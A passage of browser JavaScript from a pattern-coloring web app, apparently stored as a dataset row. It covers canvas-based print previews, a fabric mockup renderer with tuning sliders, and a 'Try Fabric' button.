id,title,username,language,date,content
        console.error(""Error handling thumbnail click:"", error);
    }
}

// Generate print preview
const generatePrintPreview = () => {
    if (!appState.currentPattern) {
        console.error(""No current pattern selected for print preview"");
        return null;
    }

    const isWall = appState.currentPattern?.isWall || appState.selectedCollection?.name === ""wall-panels"";
    const backgroundIndex = isWall ? 1 : 0;
    const backgroundInput = appState.layerInputs[backgroundIndex]?.input;
    if (!backgroundInput) {
        console.error(`Background input not found at index ${backgroundIndex}`, appState.layerInputs);
        return null;
    }

    const backgroundColor = lookupColor(backgroundInput.value);
    console.log(""Print preview - Background color:"", backgroundColor, ""isWall:"", isWall);
    console.log(""Print preview - Layer inputs:"", appState.layerInputs.map((li, i) => ({
        index: i,
        value: li?.input?.value
    })));

    const dpi = 100;
    const patternWidthInches = appState.currentPattern?.size?.[0] || 24;
    const patternHeightInches = appState.currentPattern?.size?.[1] || 24;
    const printWidth = Math.round(patternWidthInches * dpi);
    const printHeight = Math.round(patternHeightInches * dpi);
    const aspectRatio = patternHeightInches / patternWidthInches;

    console.log(`Print preview - Pattern: ${patternWidthInches}x${patternHeightInches}, Aspect: ${aspectRatio}`);
    console.log(`Print canvas: ${printWidth}x${printHeight}, DPI: ${dpi}`);

    const printCanvas = document.createElement(""canvas"");
    const printCtx = printCanvas.getContext(""2d"", { willReadFrequently: true });
    printCanvas.width = printWidth;
    printCanvas.height = printHeight;

    const collectionName = toInitialCaps(appState.selectedCollection?.name || ""Unknown"");
    const patternName = toInitialCaps(appState.currentPattern.name || ""Pattern"");
    let layerLabels = [];

    const processPrintPreview = async () => {
        printCtx.fillStyle = backgroundColor;
        printCtx.fillRect(0, 0, printWidth, printHeight);
        console.log(""Print preview - Filled background with:"", backgroundColor);

        const isTintWhite = appState.currentPattern?.tintWhite || false;
        console.log(`Print preview - tintWhite flag: ${isTintWhite}`);

        if (isTintWhite && appState.currentPattern?.baseComposite) {        } else if (appState.currentPattern?.layers?.length) {
            layerLabels = appState.currentPattern.layers.map((l, i) => ({
                label: appState.currentPattern.layerLabels?.[i] || `Layer ${i + 1}`,
                color: appState.layerInputs[i + (isWall ? 2 : 1)]?.input?.value || ""Snowbound""
            }));
            
            // Add background color to the beginning of the color list
            layerLabels.unshift({
                label: ""Background"",
                color: backgroundInput.value || ""Snowbound""
            });

            const shadowLayers = [];
            const nonShadowLayers = [];
            appState.currentPattern.layers.forEach((layer, index) => {
                const label = layerLabels[index].label;
                const isShadow = layer.isShadow === true;
                (isShadow ? shadowLayers : nonShadowLayers).push({ layer, index, label });
            });

            let nonShadowInputIndex = isWall ? 2 : 1;

            for (const { layer, index, label } of shadowLayers) {
                const layerPath = layer.path || """";
                await new Promise((resolve) => {
                    processImage(
                        layerPath,
                        (processedUrl) => {
                            const img = new Image();
                            console.log(""🧪 processedUrl type:"", typeof processedUrl, processedUrl);
                            if (processedUrl instanceof HTMLCanvasElement) {
                                img.src = processedUrl.toDataURL(""image/png"");
                            } else {
                                img.src = processedUrl;
                            }
                            img.onload = () => {
                                printCtx.globalCompositeOperation = ""multiply"";
                                printCtx.globalAlpha = 0.3;
                                printCtx.drawImage(img, 0, 0, printWidth, printHeight);
                                resolve();
                            };
                            img.onerror = () => resolve();
                        },
                        null,
                        2.2,
                        true,
                        isWall
                    );
                });
            }

            for (const { layer, index, label } of nonShadowLayers) {
                const layerPath = layer.path || """";
                const layerInput = appState.layerInputs[nonShadowInputIndex];
                const layerColor = lookupColor(layerInput?.input?.value || ""Snowbound"");
                await new Promise((resolve) => {
                    processImage(
                        layerPath,
                        (processedUrl) => {
                            const img = new Image();
                            console.log(""🧪 processedUrl type:"", typeof processedUrl, processedUrl);
                            if (processedUrl instanceof HTMLCanvasElement) {
                                img.src = processedUrl.toDataURL(""image/png"");
                            } else {
                                img.src = processedUrl;
                            }
                            img.onload = () => {
                                printCtx.globalCompositeOperation = ""source-over"";
                                printCtx.globalAlpha = 1.0;
                                printCtx.drawImage(img, 0, 0, printWidth, printHeight);
                                nonShadowInputIndex++;
                                resolve();
                            };
                            img.onerror = () => resolve();
                        },
                        layerColor,
                        2.2,
                        false,
                        isWall
                    );
                });
            }
        }

        const dataUrl = printCanvas.toDataURL(""image/png"");
        console.log(`Print preview - Generated data URL, length: ${dataUrl.length}`);

        // Generate HTML content
        let textContent = `
            <img src=""https://so-animation.com/colorflex/img/SC-header-mage.jpg"" alt=""SC Logo"" class=""sc-logo"">
            <h2>${collectionName}</h2>
            <h3>${patternName}</h3>
            <ul style=""list-style: none; padding: 0;"">
        `;
        layerLabels.forEach(({ label, color }, index) => {
            const swNumber = appState.selectedCollection?.curatedColors?.[index] || color || ""N/A"";
            textContent += `
                <li>${toInitialCaps(label)} | ${swNumber}</li>
            `;
        });
        textContent += ""</ul>"";

        // Open preview window
        const previewWindow = window.open('', '_blank', 'width=800,height=1200');
        if (!previewWindow) {
            console.error(""Print preview - Failed to open preview window"");
            return { canvas: printCanvas, dataUrl };
        }

        previewWindow.document.write(`
            <html>
                <head>
                    <title>Print Preview</title>
                    <link href=""https://fonts.googleapis.com/css2?family=Special+Elite&display=swap"" rel=""stylesheet"">
                    <style>
                        body {
                            font-family: 'Special Elite', 'Times New Roman', serif !important;
                            padding: 20px;
                            margin: 0;
                            display: flex;
                            justify-content: center;
                            align-items: flex-start;
                            min-height: 100vh;
                            background-color: #111827;
                            color: #f0e6d2;
                            overflow: auto;
                        }
                        .print-container {
                            text-align: center;
                            max-width: 600px;
                            width: 100%;
                            display: flex;
                            flex-direction: column;
                            align-items: center;
                            background-color: #434341;
                            padding: 20px;
                            border-radius: 8px;
                        }
                        .sc-logo {
                            width: 400px !important;
                            height: auto;
                            margin: 0 auto 20px;
                            display: block;
                        }
                        h2 { font-size: 24px; margin: 10px 0; }
                        h3 { font-size: 20px; margin: 5px 0; }
                        ul { margin: 10px 0; }
                        li { margin: 5px 0; font-size: 16px; }
                        img { max-width: 100%; height: auto; margin: 20px auto; display: block; }
                        .button-container { margin-top: 20px; }
                        button {
                            font-family: 'Special Elite', serif;
                            padding: 10px 20px;
                            margin: 0 10px;
                            font-size: 16px;
                            cursor: pointer;
                            background-color: #f0e6d2;
                            color: #111827;
                            border: none;
                            border-radius: 4px;
                        }
                        button:hover {
                            background-color: #e0d6c2;
                        }
                    </style>
                </head>
                <body>
                    <div class=""print-container"">
                        ${textContent}
                        <img src=""${dataUrl}"" alt=""Pattern Preview"">
                        <div class=""button-container"">
                            <button onclick=""window.print();"">Print</button>
                            <button onclick=""download()"">Download</button>
                            <button onclick=""window.close();"">Close</button>
                        </div>
                    </div>
                    <script>
                        function download() {
                            const link = document.createElement(""a"");
                            link.href = ""${dataUrl}"";
                            link.download = ""${patternName}-print.png"";
                            link.click();
                        }
                    </script>
                </body>
            </html>
        `);
        previewWindow.document.close();
        console.log(""Print preview - Preview window opened"");

        return { canvas: printCanvas, dataUrl, layerLabels, collectionName, patternName };
    };

    return processPrintPreview().catch(error => {
        console.error(""Print preview error:"", error);
        return null;
    });
};

// Start the app
async function startApp() {
    await initializeApp();
    // Call this when app starts
    await loadFurnitureConfig();

    isAppReady = true;

    console.log(""✅ App fully initialized and ready."");
}

// Run immediately if DOM is already ready
if (document.readyState === ""loading"") {
    document.addEventListener(""DOMContentLoaded"", startApp);
} else {
    startApp();
}

// === PATTERN TYPE HELPERS ===

function getPatternType(pattern, collection) {
    if (collection?.name === ""wall-panels"") return ""wall-panel"";
    if (pattern?.tintWhite) return ""tint-white""; 
    if (collection?.elements?.length) return ""element-coloring"";
    return ""standard"";
}

function getColorMapping(patternType, currentLayers, layerIndex) {
    switch (patternType) {
        case ""wall-panel"":
            return currentLayers[layerIndex + 2]; // Skip wall + background
        case ""standard"":
            const inputLayers = currentLayers.filter(layer => !layer.isShadow);
            return inputLayers[layerIndex + 1]; // Skip background
        case ""element-coloring"":
            // Future: element-specific color mapping
            const inputLayersElement = currentLayers.filter(layer => !layer.isShadow);
            return inputLayersElement[layerIndex + 1];
        default:
            return currentLayers[layerIndex + 1];
    }
}



// Add fabric tuning controls
function addFabricTuningControls() {
    // Check if controls should be shown
    if (!SHOW_FABRIC_CONTROLS) {
        return; // Exit early if controls are disabled
    }
    
    // Remove existing controls
    const existingControls = document.getElementById('fabricTuningControls');
    if (existingControls) {
        existingControls.remove();
    }
    
    // Create control panel
    const controlPanel = document.createElement('div');
    controlPanel.id = 'fabricTuningControls';
    controlPanel.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: rgba(0, 0, 0, 0.9);
        color: white;
        padding: 15px;
        border-radius: 8px;
        border: 2px solid #d4af37;
        z-index: 1000;
        font-family: monospace;
        font-size: 12px;
        max-width: 300px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
    `;
    
    // Add title
    const title = document.createElement('h3');
    title.textContent = '🧵 Fabric Tuning';
    title.style.cssText = 'margin: 0 0 10px 0; color: #d4af37; font-size: 14px;';
    controlPanel.appendChild(title);
    
    // Create sliders for each parameter
    const params = [
        { key: 'alphaStrength', label: 'Pattern Opacity', min: 0, max: 2, step: 0.1 },
        { key: 'baseTintStrength', label: 'Base Color Tint', min: 0, max: 2, step: 0.1 },
        { key: 'patternContrast', label: 'Pattern Contrast', min: 0.1, max: 3, step: 0.1 },
        { key: 'shadowMultiplier', label: 'Shadow Interaction', min: 0, max: 2, step: 0.1 },
        { key: 'colorVibrance', label: 'Color Vibrance', min: 0, max: 2, step: 0.1 },
        { key: 'glossyStrength', label: 'Glossy Finish', min: 0, max: 2, step: 0.1 }
    ];
    
    // Add blend mode selector
    const blendModeContainer = document.createElement('div');
    blendModeContainer.style.cssText = 'margin-bottom: 10px;';
    
    const blendModeLabel = document.createElement('label');
    blendModeLabel.textContent = 'Blend Mode';
    blendModeLabel.style.cssText = 'display: block; margin-bottom: 3px; font-weight: bold;';
    
    const blendModeSelect = document.createElement('select');
    blendModeSelect.style.cssText = 'width: 100%; padding: 2px; background: #333; color: white; border: 1px solid #555;';
    
    const blendModes = [
        { value: 'auto', label: 'Auto (Smart)' },
        { value: 'multiply', label: 'Multiply' },
        { value: 'overlay', label: 'Overlay' },
        { value: 'soft-light', label: 'Soft Light' },
        { value: 'hard-light', label: 'Hard Light' },
        { value: 'screen', label: 'Screen' }
    ];
    
    blendModes.forEach(mode => {
        const option = document.createElement('option');
        option.value = mode.value;
        option.textContent = mode.label;
        if (mode.value === fabricTuning.blendMode) {
            option.selected = true;
        }
        blendModeSelect.appendChild(option);
    });
    
    blendModeSelect.addEventListener('change', (e) => {
        fabricTuning.blendMode = e.target.value;
        debouncedFabricRender();
    });
    
    blendModeContainer.appendChild(blendModeLabel);
    blendModeContainer.appendChild(blendModeSelect);
    controlPanel.appendChild(blendModeContainer);
    
    params.forEach(param => {
        const container = document.createElement('div');
        container.style.cssText = 'margin-bottom: 10px;';
        
        const label = document.createElement('label');
        label.textContent = param.label;
        label.style.cssText = 'display: block; margin-bottom: 3px; font-weight: bold;';
        
        const slider = document.createElement('input');
        slider.type = 'range';
        slider.min = param.min;
        slider.max = param.max;
        slider.step = param.step;
        slider.value = fabricTuning[param.key];
        slider.style.cssText = 'width: 100%; margin-bottom: 2px;';
        
        const valueDisplay = document.createElement('span');
        valueDisplay.textContent = fabricTuning[param.key].toFixed(1);
        valueDisplay.style.cssText = 'color: #d4af37; font-weight: bold;';
        
        // Update function
        slider.addEventListener('input', (e) => {
            const value = parseFloat(e.target.value);
            fabricTuning[param.key] = value;
            valueDisplay.textContent = value.toFixed(1);
            
            // Re-render fabric in real-time with debounce
            debouncedFabricRender();
        });
        
        container.appendChild(label);
        container.appendChild(slider);
        container.appendChild(valueDisplay);
        controlPanel.appendChild(container);
    });
    
    // Add reset button
    const resetBtn = document.createElement('button');
    resetBtn.textContent = 'Reset to Defaults';
    resetBtn.style.cssText = `
        background: #d4af37;
        color: black;
        border: none;
        padding: 5px 10px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 11px;
        font-weight: bold;
        margin-top: 10px;
        width: 100%;
    `;
    
    resetBtn.addEventListener('click', () => {
        fabricTuning.alphaStrength = 1.0;
        fabricTuning.baseTintStrength = 1.0;
        fabricTuning.patternContrast = 1.0;
        fabricTuning.shadowMultiplier = 1.0;
        fabricTuning.colorVibrance = 1.2;
        fabricTuning.blendMode = 'auto';
        fabricTuning.glossyStrength = 1.0;
        
        // Update slider values
        controlPanel.querySelectorAll('input[type=""range""]').forEach((slider, index) => {
            slider.value = Object.values(fabricTuning)[index];
        });
        controlPanel.querySelectorAll('span').forEach((span, index) => {
            if (index < 5) { // Only update value displays
                span.textContent = Object.values(fabricTuning)[index].toFixed(1);
            }
        });
        
        // Update blend mode selector
        const blendModeSelect = controlPanel.querySelector('select');
        if (blendModeSelect) {
            blendModeSelect.value = fabricTuning.blendMode;
        }
        
        // Re-render with debounce
        debouncedFabricRender();
    });
    
    controlPanel.appendChild(resetBtn);
    
    // Add copy values button
    const copyBtn = document.createElement('button');
    copyBtn.textContent = 'Copy Values to Console';
    copyBtn.style.cssText = `
        background: #4a5568;
        color: white;
        border: none;
        padding: 5px 10px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 11px;
        font-weight: bold;
        margin-top: 5px;
        width: 100%;
    `;
    
    copyBtn.addEventListener('click', () => {
        console.log('🧵 Current fabric tuning values:');
        console.log('fabricTuning = {');
        Object.entries(fabricTuning).forEach(([key, value]) => {
            console.log(`    ${key}: ${value},`);
        });
        console.log('};');
    });
    
    controlPanel.appendChild(copyBtn);
    
    // Add to document
    document.body.appendChild(controlPanel);
}

// Function to remove fabric tuning controls
function removeFabricTuningControls() {
    const existingControls = document.getElementById('fabricTuningControls');
    if (existingControls) {
        existingControls.remove();
    }
}

// Simple fabric mockup function
async function renderFabricMockup() {
    console.log(""🧵 ================================"");
    console.log(""🧵 FABRIC MOCKUP STARTING"");
    console.log(""🧵 ================================"");
    
    const canvas = document.createElement(""canvas"");
    const ctx = canvas.getContext(""2d"");
    
    // Will be dynamically sized based on first loaded image
    let canvasWidth = 600;  // Default fallback
    let canvasHeight = 450; // Default fallback
    
    // Get fabric config with error handling
    console.log(""🔍 Global furnitureConfig:"", furnitureConfig);
    console.log(""🔍 Collection furnitureConfig:"", appState.selectedCollection?.furnitureConfig);
    
    // Try to get furniture config from collection first, then fall back to global
    let actualFurnitureConfig = appState.selectedCollection?.furnitureConfig || furnitureConfig;
    console.log(""🔍 Using furnitureConfig:"", actualFurnitureConfig);
    
    const fabricConfig = actualFurnitureConfig?.fabric;
    
    if (!fabricConfig) {
        console.error(""❌ Fabric config not found in furnitureConfig!"");
        console.log(""🔍 Available furniture config keys:"", Object.keys(actualFurnitureConfig || {}));
        return;
    }
    
    console.log(""🔍 Fabric config:"", fabricConfig);
    
    // Get background color (first layer is Background)
    console.log(""🔍 Current layers:"", appState.currentLayers);
    console.log(""🔍 First layer:"", appState.currentLayers[0]);
    const backgroundColor = lookupColor(appState.currentLayers[0]?.color || ""Snowbound"");
    console.log(""🎨 Background color:"", backgroundColor);
    console.log(""🔍 Base tint strength:"", fabricTuning.baseTintStrength);
    
    try {
        // 1. Load and draw room mockup background
        const mockupBg = new Image();
        mockupBg.crossOrigin = ""anonymous"";
        
        await new Promise((resolve, reject) => {
            mockupBg.onload = resolve;
            mockupBg.onerror = reject;
            mockupBg.src = `https://so-animation.com/colorflex/${fabricConfig.mockup}`;
        });
        
        // Set canvas size based on mockup image dimensions
        canvasWidth = mockupBg.width;
        canvasHeight = mockupBg.height;
        canvas.width = canvasWidth;
        canvas.height = canvasHeight;
        
        console.log(`📐 Canvas sized to match mockup: ${canvasWidth}x${canvasHeight}`);
        
        // Draw room background at full resolution
        ctx.drawImage(mockupBg, 0, 0);
        
        // 2. Load fabric base for later use
        const fabricBase = new Image();
        fabricBase.crossOrigin = ""anonymous"";
        
        await new Promise((resolve, reject) => {
            fabricBase.onload = resolve;
            fabricBase.onerror = reject;
            fabricBase.src = `https://so-animation.com/colorflex/${fabricConfig.base}`;
        });
        
        console.log(`📐 Fabric base: ${fabricBase.width}x${fabricBase.height}`);
        
        // 3. Create tinted base layer using fabric base alpha channel
        const baseCanvas = document.createElement(""canvas"");
        const baseCtx = baseCanvas.getContext(""2d"");
        baseCanvas.width = canvasWidth;
        baseCanvas.height = canvasHeight;
        
        // Draw fabric base to get alpha channel at full resolution
        baseCtx.drawImage(fabricBase, 0, 0, canvasWidth, canvasHeight);
        
        // Extract alpha channel and apply background color tint
        const baseImageData = baseCtx.getImageData(0, 0, canvasWidth, canvasHeight);
        const baseData = baseImageData.data;
        
        // Parse background color
        const bgColorMatch = backgroundColor.match(/^#([0-9a-f]{6})$/i);
        if (bgColorMatch) {
            const bgR = parseInt(bgColorMatch[1].substr(0, 2), 16);
            const bgG = parseInt(bgColorMatch[1].substr(2, 2), 16);
            const bgB = parseInt(bgColorMatch[1].substr(4, 2), 16);
            
            for (let j = 0; j < baseData.length; j += 4) {
                const r = baseData[j];
                const g = baseData[j + 1];
                const b = baseData[j + 2];
                const alpha = baseData[j + 3];
                
                if (alpha > 0) {
                    const tintStrength = fabricTuning.baseTintStrength;
                    
                    // Apply background color tint
                    baseData[j] = Math.floor(bgR * tintStrength + r * (1 - tintStrength));
                    baseData[j + 1] = Math.floor(bgG * tintStrength + g * (1 - tintStrength));
                    baseData[j + 2] = Math.floor(bgB * tintStrength + b * (1 - tintStrength));
                    // Keep original alpha channel
                }
            }
            
            baseCtx.putImageData(baseImageData, 0, 0);
        }
        
        console.log(""✅ Created tinted base layer with fabric alpha channel"");
        
        // Load pattern layers using the fabric config from furniture-config.json
        const patternSlug = createPatternSlug(appState.currentPattern.name);
        const pattern = appState.currentPattern;
        
        console.log(`🔍 Pattern layers available:`, pattern.layers);
        console.log(`🔍 Fabric config patternPathTemplate:`, fabricConfig.patternPathTemplate);
        
        // Process pattern layers (skip Background layer at index 0)
        for (let i = 0; i < pattern.layers.length; i++) {
            const layer = pattern.layers[i];
            console.log(`🔍 Pattern layer ${i} object:`, layer);
            
            // Extract filename from layer's path or imageUrl and change extension to .png
            let layerFileName;
            if (typeof layer === 'string') {
                layerFileName = layer;
            } else if (layer.path) {
                const originalFileName = layer.path.split('/').pop();
                layerFileName = originalFileName.replace(/\.(jpg|jpeg)$/i, '.png');
            } else if (layer.imageUrl) {
                const originalFileName = layer.imageUrl.split('/').pop();
                layerFileName = originalFileName.replace(/\.(jpg|jpeg)$/i, '.png');
            } else {
                layerFileName = `${patternSlug}_layer-${i+1}.png`;
            }
            
            // Use the patternPathTemplate from fabric config
            const layerPath = `https://so-animation.com/colorflex/${fabricConfig.patternPathTemplate
                .replace('{collection}', appState.selectedCollection.name)
                .replace('{patternSlug}', patternSlug)}${layerFileName}`;
            
            console.log(`🔍 Loading pattern layer ${i}: ${layerPath}`);
            
            try {
                const layerImg = new Image();
                layerImg.crossOrigin = ""anonymous"";
                
                await new Promise((resolve, reject) => {
                    layerImg.onload = resolve;
                    layerImg.onerror = reject;
                    layerImg.src = layerPath;
                });
                
                // Apply pattern to pattern composite (like pattern preview)
                const tempCanvas = document.createElement(""canvas"");
                const tempCtx = tempCanvas.getContext(""2d"");
                tempCanvas.width = canvasWidth;
                tempCanvas.height = canvasHeight;
                
                // Draw the pattern image at full resolution
                tempCtx.drawImage(layerImg, 0, 0, canvasWidth, canvasHeight);
                
                // Get the layer's color from appState (pattern layers start at index 1 after Background)
                const colorIndex = i + 1; // Skip Background layer at index 0
                const layerColor = lookupColor(appState.currentLayers[colorIndex]?.color || ""#FFFFFF"");
                console.log(`🎨 Using color ${layerColor} for pattern layer ${i} (color index ${colorIndex})`);
                
                // Parse pattern color (hex to RGB)
                const colorMatch = layerColor.match(/^#([0-9a-f]{6})$/i);
                if (!colorMatch) {
                    console.warn(`⚠️ Invalid color format for layer ${i}: ${layerColor}`);
                    continue;
                }
                
                const colorR = parseInt(colorMatch[1].substr(0, 2), 16);
                const colorG = parseInt(colorMatch[1].substr(2, 2), 16);
                const colorB = parseInt(colorMatch[1].substr(4, 2), 16);
                
                // Apply color vibrance adjustment
                const vibrance = fabricTuning.colorVibrance;
                const vibranceR = Math.floor(127 + (colorR - 127) * vibrance);
                const vibranceG = Math.floor(127 + (colorG - 127) * vibrance);
                const vibranceB = Math.floor(127 + (colorB - 127) * vibrance);
                
                console.log(`🎨 Pattern layer ${i} RGB: ${vibranceR}, ${vibranceG}, ${vibranceB}`);
                
                // Extract pattern luminance and apply color (like pattern preview)
                const imageData = tempCtx.getImageData(0, 0, canvasWidth, canvasHeight);
                const data = imageData.data;
                
                let nonTransparentPixels = 0;
                let averageLuminance = 0;
                
                // Apply pattern processing (similar to pattern preview)
                for (let j = 0; j < data.length; j += 4) {
                    const r = data[j];
                    const g = data[j + 1];
                    const b = data[j + 2];
                    const alpha = data[j + 3];
                    
                    if (alpha > 0) {
                        nonTransparentPixels++;
                        
                        // Calculate pattern luminance
                        let patternLuminance = 0.299 * r + 0.587 * g + 0.114 * b;
                        
                        // Apply pattern contrast adjustment
                        patternLuminance = Math.pow(patternLuminance / 255, 1 / fabricTuning.patternContrast) * 255;
                        averageLuminance += patternLuminance;
                        
                        // Create colored pattern with luminance-based opacity
                        const opacity = (patternLuminance / 255) * fabricTuning.alphaStrength;
                        
                        data[j] = vibranceR;
                        data[j + 1] = vibranceG;
                        data[j + 2] = vibranceB;
                        data[j + 3] = Math.min(255, opacity * 255);
                    } else {
                        data[j + 3] = 0;
                    }
                }
                
                if (nonTransparentPixels > 0) {
                    averageLuminance /= nonTransparentPixels;
                    console.log(`🔍 Pattern layer ${i}: ${nonTransparentPixels} pixels, avg luminance: ${averageLuminance.toFixed(2)}`);
                } else {
                    console.warn(`⚠️ Pattern layer ${i}: No non-transparent pixels found`);
                }
                
                // Put the processed pattern back
                tempCtx.putImageData(imageData, 0, 0);
                
                // Apply to base canvas using normal blending
                baseCtx.globalCompositeOperation = ""source-over"";
                baseCtx.drawImage(tempCanvas, 0, 0);
                
                console.log(`🔍 Applied pattern layer ${i} to base canvas`);
                
                console.log(`✅ Pattern layer ${i} (${layerFileName}) applied`);
                
            } catch (error) {
                console.warn(`⚠️ Pattern layer ${i} (${layerFileName}) failed:`, error);
            }
        }
        
        // 4. Final compositing in correct order
        console.log(""🧵 Final compositing: mockup -> base -> patterns -> fabric shadows"");
        
        // Layer 1: Mockup (unaltered room background)
        ctx.drawImage(mockupBg, 0, 0);
        
        // Layer 2: Base + Patterns (composited with alpha channel)
        ctx.globalCompositeOperation = ""source-over"";
        ctx.drawImage(baseCanvas, 0, 0);
        
        // Layer 3: Fabric base for shadows (multiply to bring shadows back)
        ctx.globalCompositeOperation = ""multiply"";
        ctx.drawImage(fabricBase, 0, 0, canvasWidth, canvasHeight);
        
        // Layer 4: Glossy finish (screen blend for shine effect)
        if (fabricTuning.glossyStrength > 0) {
            try {
                const fabricGlossy = new Image();
                fabricGlossy.crossOrigin = ""anonymous"";
                
                await new Promise((resolve, reject) => {
                    fabricGlossy.onload = resolve;
                    fabricGlossy.onerror = reject;
                    // Use fabric-glossy.png from the same directory as fabric-base.png
                    const glossyPath = fabricConfig.base.replace('fabric-base.png', 'fabric-glossy.png');
                    fabricGlossy.src = `https://so-animation.com/colorflex/${glossyPath}`;
                });
                
                console.log(`📐 Fabric glossy: ${fabricGlossy.width}x${fabricGlossy.height}`);
                
                // Apply glossy layer with screen blend mode and tunable opacity
                ctx.globalCompositeOperation = ""screen"";
                ctx.globalAlpha = fabricTuning.glossyStrength;
                ctx.drawImage(fabricGlossy, 0, 0, canvasWidth, canvasHeight);
                
                // Reset alpha and composite operation
                ctx.globalAlpha = 1.0;
                ctx.globalCompositeOperation = ""source-over"";
                
                console.log(""✅ Glossy layer applied with screen blend"");
                
            } catch (error) {
                console.warn(""⚠️ Glossy layer failed to load:"", error);
                // Continue without glossy layer if it fails
            }
        }
        
        // Reset composite operation
        ctx.globalCompositeOperation = ""source-over"";
        
        console.log(""✅ All layers composited in correct order"");
        
        // Update display - try both possible element references
        let roomMockup = document.getElementById('roomMockup');
        if (!roomMockup && dom?.roomMockup) {
            roomMockup = dom.roomMockup;
        }
        
        console.log(""🔍 roomMockup element found:"", !!roomMockup);
        console.log(""🔍 dom.roomMockup available:"", !!dom?.roomMockup);
        
        if (roomMockup) {
            const dataURL = canvas.toDataURL();
            console.log(""🔍 Canvas dataURL length:"", dataURL.length);
            console.log(""🔍 roomMockup element type:"", roomMockup.tagName);
            
            // Check if it's an img or div element
            if (roomMockup.tagName === 'IMG') {
                roomMockup.src = dataURL;
                console.log(""✅ Set fabric mockup as img src"");
            } else {
                // It's a div - preserve back button but clear other content
                console.log(""🔍 Div innerHTML before:"", roomMockup.innerHTML.substring(0, 100));
                
                // Save existing back button if it exists
                const existingButton = roomMockup.querySelector('#backToPatternsBtn');
                
                // Clear the div content
                roomMockup.innerHTML = '';
                
                // Clear the CSS background color to make background image visible
                roomMockup.style.backgroundColor = 'transparent';
                
                // Set background image
                roomMockup.style.backgroundImage = `url(${dataURL})`;
                roomMockup.style.backgroundSize = 'contain';
                roomMockup.style.backgroundRepeat = 'no-repeat';
                roomMockup.style.backgroundPosition = 'center';
                
                // Restore the back button if it existed
                if (existingButton) {
                    roomMockup.appendChild(existingButton);
                    console.log(""✅ Restored back button after clearing div"");
                }
                
                console.log(""✅ Set fabric mockup as div background and cleared other content"");
            }
            
            console.log(""✅ Fabric mockup displayed to element:"", roomMockup.id);
        } else {
            console.error(""❌ No roomMockup element found!"");
        }
        
        // Add back button for fabric mode (but only if not already present)
        if (!document.getElementById('backToPatternsBtn')) {
            addBackToPatternsButton();
        }
        
        // Add fabric tuning controls
        addFabricTuningControls();
        
    } catch (error) {
        console.error(""❌ Fabric mockup error:"", error);
    }
}

// Add Try Fabric button functionality
function addTryFabricButton() {
    console.log(""🧵 addTryFabricButton called"");
    console.log(""🧵 selectedCollection:"", appState.selectedCollection?.name);
    
    // Check if we're in a compatible collection for fabric
    if (!appState.selectedCollection || appState.selectedCollection.name !== ""botanicals"") {
        console.log(""🧵 Not botanicals collection, skipping fabric button"");
        return;
    }
    
    console.log(""🧵 Creating Try Fabric button"");
    
    const existingButton = document.getElementById('tryFabricBtn');
    if (existingButton) {
        existingButton.remove();
    }
    
    const button = document.createElement('button');
    button.id = 'tryFabricBtn';
    button.textContent = 'Try Fabric';
    button.className = 'btn btn-primary';
    button.style.cssText = `
        margin-top: 10px;
        padding: 8px 16px;
        background-color: #007bff;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
    `;
    
    button.addEventListener('click', () => {
        console.log(""🧵 ================================"");
        console.log(""🧵 TRY FABRIC BUTTON CLICKED"");
        console.log(""🧵 ================================"");
        renderFabricMockup();
    });
    
    // Add button to the appropriate location
    const tryFurnitureBtn = document.getElementById('tryFurnitureBtn');
    if (tryFurnitureBtn) {
        tryFurnitureBtn.parentNode.insertBefore(button, tryFurnitureBtn.nextSibling);
    } else {
        const controlsContainer = document.querySelector('.controls-container') || document.body;
        controlsContainer.appendChild(button);
    }
}

// Add this line at the bottom of your CFM.js file to expose the function globally:
window.addTryFurnitureButton = addTryFurnitureButton;
window.getCompatibleFurniture = getCompatibleFurniture;
window.showFurnitureModal = showFurnitureModal;
window.selectFurniture = selectFurniture;
window.renderFabricMockup = renderFabricMockup;
window.addTryFabricButton = addTryFabricButton;

// Debug function to manually test fabric
window.testFabric = function() {
    console.log(""🧵 Manual fabric test called"");
    renderFabricMockup();
};

// Simple red canvas test
window.testRedCanvas = function() {
    console.log(""🔴 Testing red canvas display"");
    const canvas = document.createElement(""canvas"");
    const ctx = canvas.getContext(""2d"");
    canvas.width = 600;
    canvas.height = 450;
    
